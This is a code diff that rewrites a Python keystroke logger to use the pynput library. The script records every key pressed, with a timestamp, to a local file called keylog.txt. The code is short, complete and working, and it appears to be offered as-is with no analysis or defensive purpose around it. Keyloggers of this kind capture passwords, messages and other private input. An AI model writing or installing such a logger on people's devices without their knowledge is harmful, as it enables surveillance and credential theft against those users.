@@ -1,14 +1,16 @@
-import keyboard
-import logging
+from pynput import keyboard
+import time
 
-# Set up logging
-logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
+def on_key_press(key):
+    log_file = open("keylog.txt", "a")
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+    log_file.write(f"{timestamp} - {key}\n")
+    log_file.close()
 
-def on_press(key):
-    logging.info(str(key))
+def main():
+    print("Press Ctrl+C to stop logging.")
+    with keyboard.Listener(on_press=on_key_press) as listener:
+        listener.join()
 
-# Start listening to key presses
-keyboard.on_press(on_press)
-keyboard.wait()  # Keep the script running
-
-# Remember to stop the script manually (e.g., Ctrl+C) when done
+if __name__ == "__main__":
+    main()
